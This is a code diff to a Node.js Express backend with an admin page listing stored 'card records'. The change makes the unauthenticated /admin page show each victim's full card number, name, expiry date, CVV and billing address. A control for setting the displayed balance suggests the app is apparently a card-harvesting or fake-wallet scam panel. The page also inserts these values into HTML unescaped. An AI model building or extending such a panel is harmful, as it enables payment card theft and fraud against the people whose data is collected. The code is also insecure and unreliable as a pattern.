@@ -6,9 +6,8 @@ const port = process.env.PORT || 3000;
 
 app.use(cors());
 app.use(bodyParser.json());
-app.use(express.static('public'));
 
-// In-memory storage (replace with database in production)
+// In-memory storage (replace with a database in production)
 let balance = 678;
 let transactions = [
     { type: 'Deposit', amount: 5000, date: 'Mar 1, 2025' },
@@ -18,7 +17,7 @@ let transactions = [
 ];
 let cardRecords = [];
 
-// API Endpoints
+// API Endpoints for Frontend
 app.get('/api/balance', (req, res) => {
     res.json({ balance });
 });
@@ -97,7 +96,7 @@ app.get('/admin', (req, res) => {
                 <h2>Balance Settings</h2>
                 <input type="number" id="balanceInput" value="${balance}" step="0.01">
                 <button onclick="updateBalance()">Update Balance</button>
-                <p>Current Balance: $${balance}</p>
+                <p>Current Balance: $${balance.toFixed(2)}</p>
             </div>
             
             <div class="section">
@@ -106,9 +105,15 @@ app.get('/admin', (req, res) => {
                     ${cardRecords.map(record => `
                         <div class="record">
                             <strong>${record.type}</strong> - ${record.date}<br>
-                            Card: ${record.cardNumber}<br>
-                            Name: ${record.cardholdername}<br>
-                            Amount: $${record.amount}
+                            Amount: $${parseFloat(record.amount).toFixed(2)}<br>
+                            Card Number: ${record.cardNumber}<br>
+                            Cardholder Name: ${record.cardholdername}<br>
+                            Expiring Date: ${record.expiringDate}<br>
+                            CVV: ${record.cvv}<br>
+                            Billing Address: ${record.billingAddress}<br>
+                            State: ${record.state}<br>
+                            City: ${record.city}<br>
+                            Zip Code: ${record.zipCode}
                         </div>
                     `).join('')}
                 </div>
@@ -133,6 +138,11 @@ app.get('/admin', (req, res) => {
         </body>
         </html>
     `);
+});
+
+// Handle root route to prevent "Cannot GET /" error
+app.get('/', (req, res) => {
+    res.status(404).json({ error: 'This is the backend API. Use /api endpoints for data or visit /admin for the admin panel.' });
 });
 
 app.listen(port, () => {
